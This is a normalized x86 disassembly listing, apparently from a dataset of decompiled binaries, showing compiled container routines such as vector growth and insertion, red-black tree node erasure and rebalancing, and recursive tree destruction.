lea ecx [ ebp + 0x13 ]
push ecx
sub edx eax
add edx ebx
push edx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_4619e0
mov edx [ esi + 0x8 ]
add edx ebx
lea eax [ ebp + 0x13 ]
mov [ esi + 0x8 ] edx
push eax
push ecx
mov esi edx
mov eax esp
sub esi ebx
mov [ ebp + 0xc ] esp
mov [ eax ] esi
jmp r-xdata
add ebx ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x14 ] 0x0
mov ebx [ ebp - 0x14 ]
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_45f3a0
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx eax
xor ecx ecx
jmp r-xdata
test eax eax
jne r-xdata
push ebx
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_45f6a0
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x13 ]
push ecx
push edx
push edi
call sub_460740
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0x14
push ecx
add edi eax
mov eax [ esi + 0x8 ]
push esi
push edi
push ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_45f6a0
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
add ecx edx
cmp ebx ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
xor ecx ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ ebx + eax ]
lea edx [ ebx + edi ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add ecx edx
mov [ ebp - 0x14 ] ecx
mov ebx ecx
sub_4690d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0c30
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov ebx ecx
mov ecx 0x5
lea edi [ ebp - 0x24 ]
[ edi ] [ esi ]
mov edi [ ebx + 0x4 ]
test edi edi
mov [ ebp - 0x10 ] esp
jne r-xdata
mov ecx [ ebx + 0xc ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov ecx edx
xor ecx ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov edx [ ebx + 0x8 ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx ebx
call sub_465430
mov eax 0xccccccc
sub eax edx
cmp eax esi
jae r-xdata
mov edx [ ebx + 0x8 ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ ebx + 0x8 ]
mov edi [ ebp + 0x8 ]
mov edx ecx
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
cmp edx esi
mov [ ebp + 0x10 ] ecx
jae r-xdata
mov eax ecx
shr eax 0x1
mov edx 0xccccccc
sub edx eax
cmp edx ecx
jae r-xdata
add edx esi
cmp ecx edx
jae r-xdata
push ecx
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
lea esi [ esi + esi * 4 ]
shl esi 0x2
sub ecx esi
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx ebx
call sub_4616a0
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
mov [ eax ] ecx
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] edi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_460660
add esp 0x10
lea ecx [ ebp - 0x24 ]
push ecx
push ecx
mov eax esp
add esi edi
mov [ eax ] esi
lea eax [ esi + esi * 4 ]
shl eax 0x2
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx ebx
mov [ ebp + 0x10 ] esp
mov [ eax ] edi
call sub_4616a0
mov ecx [ ebx + 0x8 ]
lea edx [ ebp - 0x24 ]
push edx
mov edx ecx
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
sub esi edx
push esi
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_461a10
mov edx [ ebx + 0x8 ]
mov ecx [ ebp + 0x8 ]
add edx ecx
mov [ ebx + 0x8 ] edx
mov ebx edx
lea edx [ ebp - 0x24 ]
push edx
push ecx
mov eax esp
sub ebx ecx
mov [ eax ] ebx
jmp r-xdata
add ecx eax
xor ecx ecx
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0x8 ] esp
call sub_45f3c0
add esp 0xc
mov edx [ ebx + 0x8 ]
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test edi edi
jne r-xdata
lea edi [ ecx + ecx * 4 ]
shl edi 0x2
push edi
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ ebx + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push ebx
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x0
mov [ eax ] ecx
call sub_45f6d0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push ebx
lea edx [ ebp - 0x24 ]
push edx
push esi
push eax
mov [ ebp + 0xc ] eax
call sub_460770
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ esi + esi * 4 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebx + 0x8 ]
push ebx
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_45f6d0
mov ecx [ ebx + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
mov ecx ebx
call sub_40af40
mov ecx eax
add ecx esi
add edx esi
cmp ecx edx
jae r-xdata
mov edx [ ebx + 0x8 ]
sub edx ecx
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
lea ecx [ esi + esi * 4 ]
add edi eax
lea edx [ eax + ecx * 4 ]
mov [ ebx + 0xc ] edi
mov [ ebx + 0x8 ] edx
mov [ ebx + 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
add esi edx
test ecx ecx
je r-xdata
sub_4693d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0bc0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x4 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] edx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
mov ecx esi
call sub_465430
mov ebx 0x1fffffff
sub ebx edi
cmp ebx edx
jae r-xdata
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x3
cmp eax edx
jae r-xdata
mov edi eax
shr edi 0x1
mov ebx 0x1fffffff
sub ebx edi
cmp ebx eax
jae r-xdata
add edi edx
cmp eax edi
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x3
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_4aae70
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_4013f0
add esp 0x10
lea eax [ ebp - 0x1c ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 8 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp + 0x10 ] esp
mov [ eax ] edi
call sub_4aae70
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x1c ]
push edx
mov edx ecx
sub edx edi
sar edx 0x3
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_43a250
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp - 0x1c ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax edi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_43a220
add esp 0xc
mov edi [ esi + 0x8 ]
sub edi ecx
sar edi 0x3
xor edi edi
jmp r-xdata
test ecx ecx
jne r-xdata
shl eax 0x3
push eax
mov [ ebp + 0x10 ] eax
call sub_4b573e
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0x4
push ecx
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_45f700
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push edi
call sub_4607a0
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 8 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_45f700
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
add edi edx
cmp eax edi
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
add edx ebx
lea eax [ ebx + edi * 8 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_469680
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
pop edi
pop esi
retn 0x8
mov edi edi
mov ecx esi
call sub_460f30
add esi 0x80
cmp esi edi
jne r-xdata
sub_4696b0
push ebx
mov ebx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp ebx eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov al [ esi + 0x15 ]
test al al
mov ecx esi
jne r-xdata
mov eax [ eax + 0x4 ]
push eax
mov ecx edi
call sub_460430
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ edi + 0x8 ] 0x0
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov edx [ ecx ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
push ecx
lea eax [ esp + 0x18 ]
push eax
mov ecx edi
call sub_4659a0
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov eax [ esi + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov edi edi
mov esi eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov esi eax
mov eax [ esi ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
jmp r-xdata
sub_469770
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0bb0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
push edi
mov edi [ esi + 0x4 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_465430
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x2
cmp eax edx
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
push ebx
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0xc ] esp
push ecx
shl edx 0x2
mov ecx esp
mov eax ebx
sub eax edx
mov [ ecx ] eax
mov [ ebp + 0xc ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
call sub_448080
push ecx
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov ecx [ ebp + 0xc ]
mov [ eax ] ebx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
lea edx [ ebp + 0xc ]
mov [ ebp + 0xc ] esp
push edx
mov [ eax ] edi
call sub_420d50
add esp 0x10
lea eax [ ebp + 0x10 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx edi
mov [ eax ] ecx
lea eax [ edx * 4 ]
mov [ ebp + 0x8 ] eax
add eax edi
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ebx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] edi
call sub_448080
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp + 0x10 ]
push edx
mov edx ecx
sub edx edi
sar edx 0x2
sub eax edx
push eax
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_461a40
mov ebx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ebx ecx
lea eax [ ebp + 0x10 ]
mov [ esi + 0x8 ] ebx
push eax
mov esi ebx
push ecx
mov eax esp
sub esi ecx
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] esp
push ecx
mov eax esp
mov [ eax ] edi
mov [ ebp + 0xc ] esp
call sub_4b2200
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
shl eax 0x2
push eax
mov [ ebp - 0x14 ] eax
call sub_4b573e
mov edx [ ebp + 0xc ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
mov ebx eax
mov eax [ esi + 0x4 ]
push esi
push ebx
push ecx
mov ecx esp
mov [ ecx ] edx
push ecx
mov ecx esp
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x0
mov [ ecx ] eax
call sub_453050
mov edx [ ebp + 0xc ]
add esp 0x14
mov edi eax
mov eax [ ebp + 0xc ]
push eax
push esi
lea ecx [ ebp + 0x10 ]
push ecx
push edx
push edi
call sub_420d80
mov edx [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + eax * 4 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x14
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
add ecx edx
cmp eax ecx
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx ebx
lea eax [ ebx + edi * 4 ]
mov [ esi + 0xc ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ ebp + 0xc ]
add edi eax
test ecx ecx
je r-xdata
add eax edx
sub_469a10
push 0xffffffff
push sub_4c0d08
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
push esi
push edi
mov edi [ esp + 0x68 ]
mov al [ edi + 0x89 ]
test al al
mov [ esp + 0x8 ] ecx
je r-xdata
push ebx
mov ebx edi
push ebp
lea ecx [ esp + 0x70 ]
mov [ esp + 0x14 ] ebx
call sub_45f1b0
mov ebp [ edi ]
mov al [ ebp + 0x89 ]
test al al
lea eax [ edi + 0x8 ]
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] esi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov ebp [ eax ]
mov edx [ eax ]
mov cl [ edx + 0x89 ]
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x60 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x30 ]
push ecx
mov [ esp + 0x34 ] r--data
call sub_4b5bd2
mov ecx [ ebx ]
mov [ ecx + 0x4 ] edi
mov edx [ ebx ]
mov [ edi ] edx
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov al [ ebp + 0x89 ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
cmp edi ebx
jne r-xdata
mov eax [ esp + 0x70 ]
mov edi eax
add eax 0x8
mov cl [ ebp + 0x89 ]
test cl cl
mov esi [ edi + 0x4 ]
jne r-xdata
mov esi edi
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x4 ] esi
mov [ esi ] ebp
mov ecx [ ebx + 0x8 ]
mov [ eax ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] edi
mov [ ebp + 0x4 ] esi
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] ebp
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
jmp r-xdata
mov edi [ ecx + 0x4 ]
cmp [ edi ] ebx
jne r-xdata
mov [ eax + 0x8 ] edi
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edi + 0x4 ] ecx
mov dl [ ebx + 0x88 ]
mov al [ edi + 0x88 ]
mov [ edi + 0x88 ] dl
mov [ ebx + 0x88 ] al
mov edi [ ecx + 0x4 ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov al [ ebp + 0x89 ]
test al al
je r-xdata
mov esi [ esp + 0x14 ]
add esi 0x10
mov eax [ esi + 0x6c ]
cmp eax 0x10
lea edi [ esi + 0x54 ]
jb r-xdata
mov edi [ esp + 0x10 ]
mov ecx [ edi + 0x4 ]
cmp ebp [ ecx + 0x4 ]
je r-xdata
mov eax [ esp + 0x14 ]
mov cl [ eax + 0x88 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ ebp + 0x89 ]
test al al
je r-xdata
push ebp
call sub_45d930
mov ecx [ esp + 0x14 ]
add esp 0x4
mov eax esi
jmp r-xdata
mov ebx 0xf
push 0x0
mov ecx edi
mov [ edi + 0x18 ] ebx
call sub_4011e0
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
inc eax
push eax
mov ecx edi
call sub_4010a0
push eax
mov ecx edi
call sub_4010b0
mov [ ebp + 0x88 ] bl
mov edi edi
push ebp
call sub_45d900
add esp 0x4
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ edi + 0x8 ] eax
jmp r-xdata
mov [ edi ] eax
push 0x0
mov ecx esi
mov [ esi + 0x18 ] ebx
call sub_4011e0
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
test eax eax
pop ebp
pop ebx
jbe r-xdata
inc eax
push eax
mov ecx esi
call sub_4010a0
push eax
mov ecx esi
call sub_4010b0
mov eax [ esi ]
cmp ebp eax
jne r-xdata
mov ecx [ esp + 0x68 ]
mov eax [ esp + 0x64 ]
mov [ eax ] ecx
mov ecx [ esp + 0x54 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x58
retn 0x8
dec eax
mov [ ecx + 0x8 ] eax
mov cl [ eax + 0x88 ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x88 ]
test cl cl
jne r-xdata
mov cl [ eax + 0x89 ]
test cl cl
jne r-xdata
mov [ eax + 0x88 ] bl
push esi
mov ecx edi
mov [ esi + 0x88 ] 0x0
call sub_45d9b0
mov eax [ esi ]
mov edi [ esp + 0x10 ]
mov cl [ eax + 0x89 ]
test cl cl
jne r-xdata
mov [ eax + 0x88 ] bl
push esi
mov ecx edi
mov [ esi + 0x88 ] 0x0
call sub_45d950
mov eax [ esi + 0x8 ]
mov edi [ esp + 0x10 ]
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov ebp esi
cmp ebp eax
mov esi [ esi + 0x4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0x88 ] bl
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x88 ] bl
jne r-xdata
cmp [ ebp + 0x88 ] bl
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x88 ] bl
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x88 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x88 ] bl
jne r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x88 ] bl
je r-xdata
mov cl [ esi + 0x88 ]
mov [ eax + 0x88 ] cl
mov [ esi + 0x88 ] bl
mov edx [ eax ]
push esi
mov ecx edi
mov [ edx + 0x88 ] bl
call sub_45d9b0
mov edx [ eax + 0x8 ]
mov [ edx + 0x88 ] bl
push eax
mov ecx edi
mov [ eax + 0x88 ] 0x0
call sub_45d950
mov eax [ esi ]
mov edi [ esp + 0x10 ]
mov [ eax + 0x88 ] 0x0
mov cl [ esi + 0x88 ]
mov [ eax + 0x88 ] cl
mov [ esi + 0x88 ] bl
mov edx [ eax + 0x8 ]
push esi
mov ecx edi
mov [ edx + 0x88 ] bl
call sub_45d950
jmp r-xdata
mov edx [ eax ]
mov [ edx + 0x88 ] bl
push eax
mov ecx edi
mov [ eax + 0x88 ] 0x0
call sub_45d9b0
mov eax [ esi + 0x8 ]
mov edi [ esp + 0x10 ]
sub_469de0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0c51
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x90
call sub_4b573e
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
test esi esi
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov ebx [ ebp + 0x14 ]
mov [ esi + 0x4 ] ecx
lea edi [ esi + 0x10 ]
push ebx
mov ecx edi
mov [ esi ] eax
mov [ esi + 0x8 ] edx
call sub_402400
mov eax [ ebx + 0x70 ]
mov cl [ ebp + 0x18 ]
mov [ edi + 0x70 ] eax
mov [ esi + 0x88 ] cl
mov [ esi + 0x89 ] 0x0
sub_469e90
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_469e90
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_469ee0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_469ee0
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_469f30
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
